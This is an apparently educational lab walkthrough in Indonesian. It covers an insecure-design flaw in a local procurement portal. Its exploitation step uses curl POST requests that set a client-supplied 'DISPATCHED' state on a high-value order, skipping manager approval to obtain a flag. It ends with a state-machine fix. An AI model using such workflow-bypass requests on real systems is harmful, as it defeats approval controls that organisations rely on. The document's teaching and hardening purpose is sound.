# Panduan Praktik Terbimbing: Investigasi Cacat Desain & Manipulasi Alur Status

Panduan ini disusun menggunakan metodologi 4-Tier Mission Progression dengan target komposisi **60% observasi dan analisis manual** serta **40% eksekusi perintah terminal**:

---

## Tier 1: Observasi Permukaan Serangan (Bobot: 15% — Manual)

1. **Pastikan Kontainer Lab Aktif**:
   Buka peramban web dan navigasikan ke alamat portal target:
   `http://127.0.0.1:8016`

2. **Analisis Antarmuka Zitera Procurement Portal**:
   - Amati judul dashboard: `[A06:2025] Zitera Procurement Workflow`.
   - Tinjau aturan bisnis sistem pada kotak informasi:
     - **Aturan 1**: Pesanan bernilai rendah (< $500) disetujui otomatis saat submit.
     - **Aturan 2**: Pesanan bernilai tinggi ($\ge$ $500) wajib mendapatkan tanda tangan persetujuan manajer eksekutif (`PENDING_APPROVAL`).
   - Periksa tabel *Active Procurement Orders*:
     - Pesanan #1001: Alat Tulis Kantor ($120) — Status: `DRAFT` (Pemilik: Alice).
     - Pesanan #1002: Server AI Performa Tinggi ($15.000) — Status: `PENDING_APPROVAL` (Pemilik: Bob).
     - Pesanan #9999: Klaster Datacenter Eksekutif ($50.000) — Status: `DRAFT` (Pemilik: Learner).
   - Perhatikan catatan API di bagian bawah: transisi status dieksekusi melalui endpoint `POST /api/orders/<id>/transition`.

---

## Tier 2: Penemuan Endpoint & Injeksi Hipotesis (Bobot: 25% — Manual & Probing)

1. **Uji Health Endpoint**:
   Verifikasi kesiapan layanan melalui browser atau terminal:
   ```bash
   curl -s http://127.0.0.1:8016/health
   ```
   *Respon yang diharapkan*: `{"status":"ok","lab":"A06","port":8016}`

2. **Formulasikan Hipotesis Cacat Desain**:
   *Apakah backend memverifikasi invarian bisnis dan matriks transisi yang sah, atau apakah endpoint API mempercayai parameter status yang dikirimkan oleh klien secara mentah?*

3. **Uji Status Verifikasi Awal**:
   Periksa status verifikasi praktikum saat ini:
   ```bash
   curl -s http://127.0.0.1:8016/practice/verify
   ```
   *Hasil*: Menolak dengan status `failed` karena belum ada pesanan bernilai tinggi yang berhasil menembus status `APPROVED` atau `DISPATCHED`.

---

## Tier 3: Eksploitasi Terkendali & Pengambilan Flag (Bobot: 35% — Tools: cURL)

1. **Lakukan Transisi Terlarang pada Pesanan Bernilai Tinggi**:
   Targetkan pesanan bernilai tinggi #9999 ($50.000) yang saat ini berada dalam status `DRAFT`. Sesuai aturan arsitektur, pesanan ini seharusnya tidak boleh langsung dikirimkan tanpa persetujuan manajer.

   Kirimkan request HTTP POST menggunakan cURL untuk memaksa transisi ke `DISPATCHED`:
   ```bash
   curl -s -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"target_state": "DISPATCHED"}'
   ```
   *Atau gunakan aksi force_dispatch:*
   ```bash
   curl -s -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"action": "force_dispatch"}'
   ```

2. **Analisis Respons Server & Ekstraksi Flag**:
   Perhatikan payload respons JSON yang dikembalikan oleh backend:
   - Server memperbarui status pesanan menjadi `DISPATCHED` secara instan tanpa validasi tanda tangan manajer.
   - Karena pelanggaran invarian bisnis berhasil dibuktikan pada pesanan bernilai tinggi, backend merilis flag otorisasi:
     ```json
     {
       "status": "updated",
       "flag": "ZITERA{...}"
     }
     ```
   - Salin token flag yang muncul pada layar dan submit ke tab **Challenge** di ZITERA_LAB.

---

## Tier 4: Validasi Perbaikan & Hardening Defensif (Bobot: 25% — Manual & Tools)

1. **Konfirmasi Keberhasilan Praktikum**:
   Jalankan pemeriksaan verifikasi otomatis:
   ```bash
   curl -s http://127.0.0.1:8016/practice/verify
   ```
   *Hasil*: `{"status":"passed","message":"Insecure design reproduced: High-value order bypassed manager approval into authorized state!"}`

2. **Rancang Perbaikan di Sisi Domain Model**:
   Di kode backend, hapus penerimaan `target_state` bebas dari klien dan gantikan dengan mesin status deterministik:
   ```python
   # Perbaikan Aman: Penegakan Invarian Status
   ALLOWED_TRANSITIONS = {
       "DRAFT": ["PENDING_APPROVAL", "CANCELLED"],
       "PENDING_APPROVAL": ["APPROVED", "REJECTED"],
       "APPROVED": ["DISPATCHED"]
   }

   # Validasi bahwa DRAFT tidak boleh langsung loncat ke DISPATCHED!
   if target_state not in ALLOWED_TRANSITIONS.get(current_state, []):
       return jsonify({"error": "Illegal state transition attempted"}), 400
   ```

3. **Verifikasi Penolakan**:
   Setelah perbaikan diterapkan, pengiriman payload `{"target_state": "DISPATCHED"}` pada pesanan draf akan langsung digagalkan dengan kode HTTP `400 Bad Request`.
